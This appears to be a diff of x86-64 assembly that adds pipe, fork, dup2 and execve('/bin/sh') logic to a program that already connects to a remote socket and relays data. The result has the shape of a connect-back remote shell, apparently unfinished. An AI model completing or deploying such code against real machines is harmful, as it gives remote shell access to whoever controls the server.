@@ -49,8 +49,142 @@ _start:
     syscall ; connect(sockfd, addr, 16);
     cmp eax, -1
     jle _connectFailed
+    ;
+    ; excute shell
+    ;
+    ;               $rdi
+    ; int pipe(int pipefd[2]);
+    ;
+    ; Return Value:
+    ; On  success,  zero  is returned.  On error, -1 is returned, 
+    ; errno is set appropriately, and pipefd is left unchanged
+    ;
+    lea rdi, [rbp + fd1]
+    mov rax, SYS_PIPE
+    syscall
+    cmp eax, 0
+    jne _pipeFailed
 
+    lea rdi, [rbp + fd2]
+    mov rax, SYS_PIPE
+    syscall
+    cmp eax, 0
+    jne _pipeFailed
 
+     ;
+    ; pid_t fork(void);
+    ;
+    ; Return Value:
+    ; On  success,  the PID of the child process is returned in the parent, 
+    ; and 0 is returned in the child.  On failure, -1 is returned in the parent, 
+    ; no child process  is  created, and errno is set appropriately.
+    ;
+    mov rax, SYS_FORK
+    syscall
+    cmp eax, -1
+    je _forkFailed
+    cmp eax, 0
+    jne _parent
+_child:
+    ;
+    ; int close(int fd);
+    ;
+    ; close()  returns zero on success.  On error, -1 is returned, 
+    ; and errno is set appropriately
+    ;
+    mov edi, dword[rbp + fd1.write]
+    mov rax, SYS_CLOSE
+    syscall
+    cmp eax, 0
+    jne _closeFailed
+
+    mov edi, dword[rbp + fd2.read]
+    mov rax, SYS_CLOSE
+    syscall
+    cmp eax, 0
+    jne _closeFailed
+
+    mov edi, dword[rbp + fd2.write]
+    cmp edi, STDOUT_FILENO; stdout -> fd2[1](write)
+    je _job1
+    ;               $rdi       $rsi
+    ; int dup2(int oldfd, int newfd);
+    ;
+    ; Return Value:
+    ; On success, these system calls return the new file descriptor.  
+    ; On  error,  -1  is  returned, and errno is set appropriately.
+    ;
+    mov edi, dword[rbp + fd2.write]
+    mov esi, STDOUT_FILENO
+    mov rax, SYS_DUP2
+    syscall
+    cmp eax, -1
+    je _dup2Failed
+    ;
+    ; int close(int fd);
+    ;
+    ; close()  returns zero on success.  On error, -1 is returned, 
+    ; and errno is set appropriately
+    ;
+    mov edi, dword[rbp + fd2.write]
+    mov rax, SYS_CLOSE
+    syscall
+    cmp eax, 0
+    jne _closeFailed
+
+_job1:
+    mov edi, dword[rbp + fd1.read] 
+    cmp edi, STDIN_FILENO ; stdin -> fd1[0](read)
+    je _job2
+    mov edi, dword[rbp + fd1.read]
+    mov esi, STDIN_FILENO
+    mov rax, SYS_DUP2
+    syscall
+    cmp eax, -1
+    je _dup2Failed
+
+    mov edi, dword[rbp + fd1.read]
+    mov rax, SYS_CLOSE
+    syscall
+    cmp eax, 0
+    jne _closeFailed
+_job2:
+    ;execve
+    ;
+    ; int execve(const char *pathname, char *const argv[],
+    ;              char *const envp[]);
+    ; Return Value :
+    ; On  success, execve() does not return, on error -1 is returned, 
+    ; and errno is set appropriately.
+    mov qword[rbp + newargv.sh], binsh
+    mov qword[rbp + newargv.null], 0
+    mov qword[rbp + newenviron.null], 0
+    mov rdi, binsh
+    lea rsi, [rbp + newargv]
+    lea rdx, [rbp + newenviron]
+    mov rax, SYS_EXECVE
+    syscall
+    exit
+
+_parent:
+    ;
+    ; int close(int fd);
+    ;
+    ; close()  returns zero on success.  On error, -1 is returned, 
+    ; and errno is set appropriately
+    ;
+    mov dword[rbp + pid.pid], eax ; save pid
+    mov edi, dword[rbp + fd1.read]
+    mov rax, SYS_CLOSE
+    syscall
+    cmp eax, 0
+    jne _closeFailed
+
+    mov edi, dword[rbp + fd2.write]
+    mov rax, SYS_CLOSE
+    syscall
+    cmp eax, 0
+    jne _closeFailed
     ;                      $rdi        $rsi        $rdx      $r10    
     ;ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags,
     ;                                     $r8                 $r9
@@ -80,6 +214,9 @@ _start:
     mov dword[rbp + socket.len], eax ; save to length
     mov byte[rbp + socket.buf + rax ], 10 ; buf[numbytes] = '\n';
 
+    ;Input Command
+    
+
     ;exit String Check Routine
     lea rax, [rbp + socket.buf] ; rax = &buf
     mov rcx, -1 ; index
@@ -91,6 +228,31 @@ _strcheck:
     mov dl, byte[exitString + rcx] ; "e", "x", "i", "t", "\n"
     cmp al, dl
     je _strcheck
+
+
+
+
+    ;                   $rdi               $rsi         $rdx      $r10
+    ;ssize_t sendto(int sockfd, const void *buf, size_t len, int flags,
+    ;                                           $r8                    $r9
+    ;                  const struct sockaddr *dest_addr, socklen_t addrlen);
+    ; Return Value:
+    ; On success, these calls return the number of bytes sent.  
+    ; On error, -1 is returned, and errno is set appropriately.
+    mov edi, dword[rbp + socket.socketfd] ; sockfd
+    lea rsi, [rbp + socket.buf] ; buf
+    mov edx, dword[rbp + socket.len] ; len
+    add edx, 1 ; + '\0'
+    mov r10, 0 ;
+    mov r8, 0 ;
+    mov r9, 0 ; because it is already connected
+    mov rax, SYS_SENDTO
+    syscall
+    cmp eax, -1
+    je _sendtoFailed
+
+
+
 
 
 
@@ -108,6 +270,8 @@ _exit:
     mov rsp, rbp
     pop rbp
     exit
+
+
 
 
 ;--------------------------------Thread---------------------------------------------
@@ -227,6 +391,10 @@ endstruc
 
 struc c, -0x18d ; 397 Last Size + Current Size
     .char: resb 1 ;1bytes
+endstruc
+
+struc available, -0x18e  
+    .available: resb 1;1bytes
 endstruc
 
 ;--------------------------------Data Structure-------------------------------------
